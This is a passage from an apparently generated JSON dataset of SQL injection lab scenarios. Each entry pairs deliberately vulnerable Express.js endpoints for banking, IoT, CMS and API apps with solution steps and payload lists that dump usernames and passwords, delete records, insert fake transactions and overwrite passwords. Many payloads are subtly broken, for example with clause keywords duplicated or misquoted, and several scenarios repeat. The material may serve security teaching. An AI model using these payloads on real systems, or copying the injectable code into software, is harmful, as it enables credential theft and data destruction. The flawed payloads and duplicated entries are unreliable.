      "1 UNION SELECT username, password FROM users--",
      "2 UNION SELECT username, email FROM users--",
      "3 UNION SELECT role, password FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in INSERT Clause",
    "Lab Description": "The banking portal allows users to add transactions but fails to sanitize input in the INSERT clause. To solve: Inject SQL to add fake transactions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction add endpoint.",
      "Inject SQL payloads into the 'amount' parameter, such as '1000); INSERT INTO transactions (amount, user_id) VALUES (1000, 1)--'.",
      "Observe the response for any successful transaction insertion.",
      "Use sqlmap to automate the exploitation and insert fake transactions.",
      "Verify the successful insertion of fake transaction data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-transaction', (req, res) => {\n  const { amount, user_id } = req.body;\n  const query = `INSERT INTO transactions (amount, user_id) VALUES ('${amount}', '${user_id}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Transaction added' });\n  });\n});",
    "payloads": [
      "1000); INSERT INTO transactions (amount, user_id) VALUES (1000, 1)--",
      "500); INSERT INTO transactions (amount, user_id) VALUES (500, 2)--",
      "200); INSERT INTO transactions (amount, user_id) VALUES (200, 3)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in UPDATE Clause",
    "Lab Description": "The IoT dashboard allows users to update device status but fails to sanitize input in the UPDATE clause. To solve: Exploit the UPDATE clause to modify device data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the update device status endpoint.",
      "Inject SQL payloads into the 'status' parameter, such as 'active, (SELECT username FROM users LIMIT 1)--'.",
      "Observe the response for any device status modification.",
      "Use sqlmap to automate the exploitation and modify device data.",
      "Verify the successful update of device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/update-device', (req, res) => {\n  const { status, device_id } = req.body;\n  const query = `UPDATE devices SET status = '${status}' WHERE id = '${device_id}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Device status updated' });\n  });\n});",
    "payloads": [
      "active, (SELECT username FROM users LIMIT 1)--",
      "inactive, (SELECT password FROM users LIMIT 1)--",
      "active, (SELECT email FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in UPDATE Clause",
    "Lab Description": "The CMS allows administrators to update article details but fails to sanitize input in the UPDATE clause. To solve: Exploit the UPDATE clause to modify article content.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the update article endpoint.",
      "Inject SQL payloads into the 'content' parameter, such as 'new content, (SELECT username FROM users LIMIT 1)--'.",
      "Observe the response for any article content modification.",
      "Use sqlmap to automate the exploitation and modify the content of an article.",
      "Verify the successful modification of article data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/update-article', (req, res) => {\n  const { content, article_id } = req.body;\n  const query = `UPDATE articles SET content = '${content}' WHERE id = '${article_id}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Article updated' });\n  });\n});",
    "payloads": [
      "new content, (SELECT username FROM users LIMIT 1)--",
      "updated content, (SELECT password FROM users LIMIT 1)--",
      "new content, (SELECT email FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in DELETE Clause",
    "Lab Description": "The API Gateway allows users to delete specific records but fails to sanitize input in the DELETE clause. To solve: Exploit the DELETE clause to remove records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the delete record endpoint.",
      "Inject SQL payloads into the 'record_id' parameter, such as '1; DELETE FROM records--'.",
      "Check the response for successful record deletion.",
      "Use sqlmap to automate the exploitation and remove records from the database.",
      "Verify the successful deletion of records."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/delete-record', (req, res) => {\n  const record_id = req.query.record_id;\n  const query = `DELETE FROM records WHERE id = ${record_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Record deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM records--",
      "2; DELETE FROM records--",
      "3; DELETE FROM records--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal allows users to view transactions grouped by category but fails to sanitize input in the GROUP BY clause. To solve: Exploit the GROUP BY clause to extract sensitive account information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction grouping endpoint.",
      "Inject SQL payloads into the 'group_by' parameter, such as 'category GROUP BY (SELECT username FROM users LIMIT 1)--'.",
      "Observe the response for any sensitive account data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user details."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-group', (req, res) => {\n  const group_by = req.query.group_by;\n  const query = `SELECT * FROM transactions GROUP BY ${group_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "category GROUP BY (SELECT username FROM users LIMIT 1)--",
      "date GROUP BY (SELECT password FROM users LIMIT 1)--",
      "amount GROUP BY (SELECT email FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard allows users to filter devices based on their sensor data using the HAVING clause, but input is not sanitized. To solve: Exploit the HAVING clause to extract data about users and devices.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device filtering endpoint.",
      "Inject SQL payloads into the 'sensor_value' parameter, such as 'HAVING 1=1 UNION SELECT ip_address, mac_address FROM devices--'.",
      "Check for any sensitive device data leakage.",
      "Use sqlmap to automate the exploitation and extract device details.",
      "Verify the successful retrieval of device information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-device', (req, res) => {\n  const sensor_value = req.query.sensor_value;\n  const query = `SELECT * FROM devices HAVING ${sensor_value}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "HAVING 1=1 UNION SELECT ip_address, mac_address FROM devices--",
      "HAVING 1=1 UNION SELECT name, location FROM devices--",
      "HAVING 1=1 UNION SELECT model, manufacturer FROM devices--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in SELECT Clause",
    "Lab Description": "The CMS allows filtering of content based on tags but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to extract sensitive content.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the content filtering endpoint.",
      "Inject SQL payloads into the 'tag' parameter, such as 'tag UNION SELECT title, content FROM articles--'.",
      "Observe the response for any content data leakage.",
      "Use sqlmap to automate the exploitation and retrieve articles from the CMS.",
      "Verify the successful extraction of articles."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-content', (req, res) => {\n  const tag = req.query.tag;\n  const query = `SELECT * FROM content WHERE tag = '${tag}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "tag UNION SELECT title, content FROM articles--",
      "tag UNION SELECT id, content FROM articles--",
      "tag UNION SELECT author, content FROM articles--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in WHERE Clause",
    "Lab Description": "The API Gateway allows querying records based on filters but fails to sanitize input in the WHERE clause. To solve: Exploit the WHERE clause to inject SQL and extract sensitive data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the query records endpoint.",
      "Inject SQL payloads into the 'record_id' parameter, such as '1 OR 1=1--'.",
      "Check the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve record details.",
      "Verify the successful extraction of records."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-records', (req, res) => {\n  const record_id = req.query.record_id;\n  const query = `SELECT * FROM records WHERE id = ${record_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 OR 1=1--",
      "2 OR 1=1--",
      "3 OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in DELETE Clause",
    "Lab Description": "The banking portal allows deletion of transactions but fails to sanitize input in the DELETE clause. To solve: Exploit the DELETE clause to delete specific records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction delete endpoint.",
      "Inject SQL payloads into the 'transaction_id' parameter, such as '1; DELETE FROM transactions WHERE user_id=1--'.",
      "Check the response for successful transaction deletion.",
      "Use sqlmap to automate the exploitation and delete sensitive records.",
      "Verify the successful deletion of transaction records."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/delete-transaction', (req, res) => {\n  const transaction_id = req.query.transaction_id;\n  const query = `DELETE FROM transactions WHERE id = ${transaction_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Transaction deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM transactions WHERE user_id=1--",
      "2; DELETE FROM transactions WHERE user_id=2--",
      "3; DELETE FROM transactions WHERE user_id=3--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in SELECT Clause",
    "Lab Description": "The IoT dashboard allows querying device information but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to extract sensitive device data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device info endpoint.",
      "Inject SQL payloads into the 'device_id' parameter, such as '1 UNION SELECT ip_address, status FROM devices--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device configurations.",
      "Verify the successful extraction of device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-info', (req, res) => {\n  const device_id = req.query.device_id;\n  const query = `SELECT * FROM devices WHERE id = ${device_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT ip_address, status FROM devices--",
      "2 UNION SELECT mac_address, status FROM devices--",
      "3 UNION SELECT device_name, status FROM devices--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in INSERT Clause",
    "Lab Description": "The CMS allows inserting new articles but fails to sanitize input in the INSERT clause. To solve: Exploit the INSERT clause to add fake articles.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article insertion endpoint.",
      "Inject SQL payloads into the 'title' parameter, such as 'New Title); INSERT INTO articles (title, content) VALUES (\\'Fake Title\\', \\'Fake content\\')--'.",
      "Check for successful insertion of the fake article.",
      "Use sqlmap to automate the exploitation and insert fake content into the CMS.",
      "Verify the successful addition of a fake article."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-article', (req, res) => {\n  const { title, content } = req.body;\n  const query = `INSERT INTO articles (title, content) VALUES ('${title}', '${content}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Article added' });\n  });\n});",
    "payloads": [
      "New Title); INSERT INTO articles (title, content) VALUES ('Fake Title', 'Fake content')--",
      "Another Title); INSERT INTO articles (title, content) VALUES ('Fake Content', 'Fake text')--",
      "Example Title); INSERT INTO articles (title, content) VALUES ('Injected Article', 'Malicious content')--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in UPDATE Clause",
    "Lab Description": "The API Gateway allows updating user information but fails to sanitize input in the UPDATE clause. To solve: Exploit the UPDATE clause to modify user details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the update user info endpoint.",
      "Inject SQL payloads into the 'user_id' parameter, such as '1; UPDATE users SET password=\\'newpassword\\' WHERE id=1--'.",
      "Check the response for any successful update of user data.",
      "Use sqlmap to automate the exploitation and update user passwords.",
      "Verify the successful update of user details."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.put('/update-user', (req, res) => {\n  const { user_id, new_password } = req.body;\n  const query = `UPDATE users SET password = '${new_password}' WHERE id = ${user_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'User updated' });\n  });\n});",
    "payloads": [
      "1; UPDATE users SET password='newpassword' WHERE id=1--",
      "2; UPDATE users SET password='newpassword' WHERE id=2--",
      "3; UPDATE users SET password='newpassword' WHERE id=3--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in LIMIT Clause",
    "Lab Description": "The banking portal allows filtering transactions but fails to sanitize input in the LIMIT clause. To solve: Exploit the LIMIT clause to bypass filtering and extract more data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'limit' parameter, such as '1 UNION SELECT username, password FROM users LIMIT 10--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of account information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const limit = req.query.limit;\n  const query = `SELECT * FROM transactions LIMIT ${limit}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users LIMIT 10--",
      "2 UNION SELECT email, password FROM users LIMIT 5--",
      "3 UNION SELECT id, email FROM users LIMIT 3--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal allows sorting transactions by date, but input is not sanitized in the ORDER BY clause. To solve: Exploit the ORDER BY clause to manipulate the query and extract sensitive data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction sorting endpoint.",
      "Inject SQL payloads into the 'order_by' parameter, such as 'ORDER BY 1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-sort', (req, res) => {\n  const order_by = req.query.order_by;\n  const query = `SELECT * FROM transactions ORDER BY ${order_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "ORDER BY 1 UNION SELECT username, password FROM users--",
      "ORDER BY 2 UNION SELECT email, password FROM users--",
      "ORDER BY 3 UNION SELECT id, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in INSERT Clause",
    "Lab Description": "The IoT dashboard allows users to add devices but fails to sanitize input in the INSERT clause. To solve: Exploit the INSERT clause to insert malicious data into the device database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the add device endpoint.",
      "Inject SQL payloads into the 'device_name' parameter, such as 'DeviceName'); INSERT INTO devices (name, ip_address) VALUES ('Hacked Device', 'malicious_ip')--'.",
      "Check for successful insertion of the malicious device.",
      "Use sqlmap to automate the exploitation and insert new devices into the database.",
      "Verify the successful addition of malicious data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-device', (req, res) => {\n  const { device_name, ip_address } = req.body;\n  const query = `INSERT INTO devices (name, ip_address) VALUES ('${device_name}', '${ip_address}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Device added' });\n  });\n});",
    "payloads": [
      "DeviceName'); INSERT INTO devices (name, ip_address) VALUES ('Hacked Device', 'malicious_ip')--",
      "NewDevice'); INSERT INTO devices (name, ip_address) VALUES ('Fake Device', 'malicious_ip')--",
      "AnotherDevice'); INSERT INTO devices (name, ip_address) VALUES ('Compromised Device', 'malicious_ip')--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in WHERE Clause",
    "Lab Description": "The CMS allows filtering of articles but fails to sanitize input in the WHERE clause. To solve: Exploit the WHERE clause to extract sensitive content from the articles database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article filtering endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'category WHERE 1=1 UNION SELECT title, content FROM articles--'.",
      "Observe the response for any sensitive content leakage.",
      "Use sqlmap to automate the exploitation and retrieve article data.",
      "Verify the successful extraction of article titles and content."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-articles', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM articles WHERE category = '${filter}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "category WHERE 1=1 UNION SELECT title, content FROM articles--",
      "category WHERE 1=1 UNION SELECT id, content FROM articles--",
      "category WHERE 1=1 UNION SELECT author, content FROM articles--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in INSERT Clause",
    "Lab Description": "The API Gateway allows adding new records but fails to sanitize input in the INSERT clause. To solve: Exploit the INSERT clause to add arbitrary data into the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a request to the insert record endpoint.",
      "Inject SQL payloads into the 'record_name' parameter, such as 'RecordName'); INSERT INTO records (name, value) VALUES ('MaliciousRecord', 'HackedValue')--'.",
      "Check for successful insertion of the malicious record.",
      "Use sqlmap to automate the exploitation and insert new records.",
      "Verify the successful addition of malicious records."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-record', (req, res) => {\n  const { record_name, value } = req.body;\n  const query = `INSERT INTO records (name, value) VALUES ('${record_name}', '${value}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Record added' });\n  });\n});",
    "payloads": [
      "RecordName'); INSERT INTO records (name, value) VALUES ('MaliciousRecord', 'HackedValue')--",
      "NewRecord'); INSERT INTO records (name, value) VALUES ('InjectedRecord', 'FakeValue')--",
      "ExampleRecord'); INSERT INTO records (name, value) VALUES ('InjectedRecord2', 'MaliciousValue')--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in SELECT Clause",
    "Lab Description": "The banking portal allows filtering transactions by account type but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to retrieve sensitive user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'account_type' parameter, such as 'account_type UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const account_type = req.query.account_type;\n  const query = `SELECT * FROM transactions WHERE account_type = '${account_type}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "account_type UNION SELECT username, password FROM users--",
      "account_type UNION SELECT email, password FROM users--",
      "account_type UNION SELECT id, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in JOIN Clause",
    "Lab Description": "The CMS allows displaying user comments on articles but fails to sanitize input in the JOIN clause. To solve: Exploit the JOIN clause to extract user data from the 'users' table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the comments endpoint.",
      "Inject SQL payloads into the 'article_id' parameter, such as '1 JOIN users ON users.id = comments.user_id--'.",
      "Check for any user data leakage from the 'users' table.",
      "Use sqlmap to automate the exploitation and retrieve user details.",
      "Verify the successful extraction of user information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/article-comments', (req, res) => {\n  const article_id = req.query.article_id;\n  const query = `SELECT * FROM comments WHERE article_id = '${article_id}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 JOIN users ON users.id = comments.user_id--",
      "2 JOIN users ON users.email = comments.user_email--",
      "3 JOIN users ON users.username = comments.user_name--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in DELETE Clause",
    "Lab Description": "The API Gateway allows deleting records but fails to sanitize input in the DELETE clause. To solve: Exploit the DELETE clause to delete critical records from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a request to the delete record endpoint.",
      "Inject SQL payloads into the 'record_id' parameter, such as '1; DELETE FROM records WHERE id=1--'.",
      "Check for successful deletion of the record.",
      "Use sqlmap to automate the exploitation and delete arbitrary records.",
      "Verify the successful deletion of records."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/delete-record', (req, res) => {\n  const { record_id } = req.body;\n  const query = `DELETE FROM records WHERE id = ${record_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Record deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM records WHERE id=1--",
      "2; DELETE FROM records WHERE id=2--",
      "3; DELETE FROM records WHERE id=3--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in GROUP BY Clause",
    "Lab Description": "The IoT dashboard allows users to view device status grouped by categories but fails to sanitize input in the GROUP BY clause. To solve: Exploit the GROUP BY clause to extract sensitive information from the devices table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device status endpoint.",
      "Inject SQL payloads into the 'group_by' parameter, such as 'GROUP BY 1 UNION SELECT device_name, ip_address FROM devices--'.",
      "Check for successful extraction of sensitive data.",
      "Use sqlmap to automate the exploitation and retrieve device data.",
      "Verify the successful extraction of device information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-status', (req, res) => {\n  const group_by = req.query.group_by;\n  const query = `SELECT * FROM devices GROUP BY ${group_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "GROUP BY 1 UNION SELECT device_name, ip_address FROM devices--",
      "GROUP BY 2 UNION SELECT id, ip_address FROM devices--",
      "GROUP BY 3 UNION SELECT id, name FROM devices--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in LIMIT Clause",
    "Lab Description": "The banking portal allows limiting the number of transactions displayed but fails to sanitize input in the LIMIT clause. To solve: Exploit the LIMIT clause to extract sensitive user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction listing endpoint.",
      "Inject SQL payloads into the 'limit' parameter, such as 'LIMIT 1,1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const limit = req.query.limit;\n  const query = `SELECT * FROM transactions LIMIT ${limit}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "LIMIT 1,1 UNION SELECT username, password FROM users--",
      "LIMIT 2,1 UNION SELECT id, password FROM users--",
      "LIMIT 3,1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in INSERT Clause",
    "Lab Description": "The IoT dashboard allows adding new devices but fails to sanitize input in the INSERT clause. To solve: Exploit the INSERT clause to insert malicious data into the devices table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the add device endpoint.",
      "Inject SQL payloads into the 'device_name' parameter, such as ''); INSERT INTO devices (name, type) VALUES ('MaliciousDevice', 'Compromised')--'.",
      "Check for successful insertion of malicious data into the devices table.",
      "Use sqlmap to automate the exploitation and insert data.",
      "Verify the successful insertion of compromised device."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-device', (req, res) => {\n  const { device_name, device_type } = req.body;\n  const query = `INSERT INTO devices (name, type) VALUES ('${device_name}', '${device_type}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Device added' });\n  });\n});",
    "payloads": [
      "'); INSERT INTO devices (name, type) VALUES ('MaliciousDevice', 'Compromised')--",
      "'); INSERT INTO devices (name, type) VALUES ('HackedDevice', 'Rooted')--",
      "'); INSERT INTO devices (name, type) VALUES ('ExploitDevice', 'Hijacked')--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in JOIN Clause",
    "Lab Description": "The API Gateway allows querying joined data but fails to sanitize input in the JOIN clause. To solve: Exploit the JOIN clause to retrieve additional sensitive data from other tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a request to the join query endpoint.",
      "Inject SQL payloads into the 'join_table' parameter, such as 'JOIN users ON users.id = transactions.user_id UNION SELECT username, password FROM users--'.",
      "Check for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and extract sensitive data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-data', (req, res) => {\n  const join_table = req.query.join_table;\n  const query = `SELECT * FROM transactions JOIN ${join_table}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "JOIN users ON users.id = transactions.user_id UNION SELECT username, password FROM users--",
      "JOIN employees ON employees.id = transactions.user_id UNION SELECT email, password FROM users--",
      "JOIN accounts ON accounts.id = transactions.user_id UNION SELECT id, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in GROUP BY Clause",
    "Lab Description": "The CMS allows categorizing articles by author but fails to sanitize input in the GROUP BY clause. To solve: Exploit the GROUP BY clause to retrieve sensitive data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article categorization endpoint.",
      "Inject SQL payloads into the 'group_by' parameter, such as 'GROUP BY 1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/group-articles', (req, res) => {\n  const group_by = req.query.group_by;\n  const query = `SELECT * FROM articles GROUP BY ${group_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "GROUP BY 1 UNION SELECT username, password FROM users--",
      "GROUP BY 2 UNION SELECT email, password FROM users--",
      "GROUP BY 3 UNION SELECT id, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in DELETE Clause",
    "Lab Description": "The IoT dashboard allows deleting devices but fails to sanitize input in the DELETE clause. To solve: Exploit the DELETE clause to delete arbitrary devices from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the delete device endpoint.",
      "Inject SQL payloads into the 'device_id' parameter, such as '1; DELETE FROM devices WHERE id = 2--'.",
      "Check for successful deletion of the device.",
      "Use sqlmap to automate the exploitation and delete arbitrary devices.",
      "Verify the successful deletion of devices."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/delete-device', (req, res) => {\n  const device_id = req.body.device_id;\n  const query = `DELETE FROM devices WHERE id = ${device_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Device deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM devices WHERE id = 2--",
      "2; DELETE FROM devices WHERE id = 3--",
      "3; DELETE FROM devices WHERE id = 4--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in SELECT Clause",
    "Lab Description": "The banking portal allows viewing transactions by account number but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to retrieve additional sensitive data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction viewing endpoint.",
      "Inject SQL payloads into the 'account_number' parameter, such as 'SELECT * FROM transactions WHERE account_number = '12345' UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/view-transactions', (req, res) => {\n  const account_number = req.query.account_number;\n  const query = `SELECT * FROM transactions WHERE account_number = '${account_number}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "SELECT * FROM transactions WHERE account_number = '12345' UNION SELECT username, password FROM users--",
      "SELECT * FROM transactions WHERE account_number = '98765' UNION SELECT id, password FROM users--",
      "SELECT * FROM transactions WHERE account_number = '11111' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in ORDER BY Clause",
    "Lab Description": "The CMS allows sorting articles by publication date but fails to sanitize input in the ORDER BY clause. To solve: Exploit the ORDER BY clause to retrieve sensitive data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article sorting endpoint.",
      "Inject SQL payloads into the 'sort_by' parameter, such as 'ORDER BY 1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sort-articles', (req, res) => {\n  const sort_by = req.query.sort_by;\n  const query = `SELECT * FROM articles ORDER BY ${sort_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "ORDER BY 1 UNION SELECT username, password FROM users--",
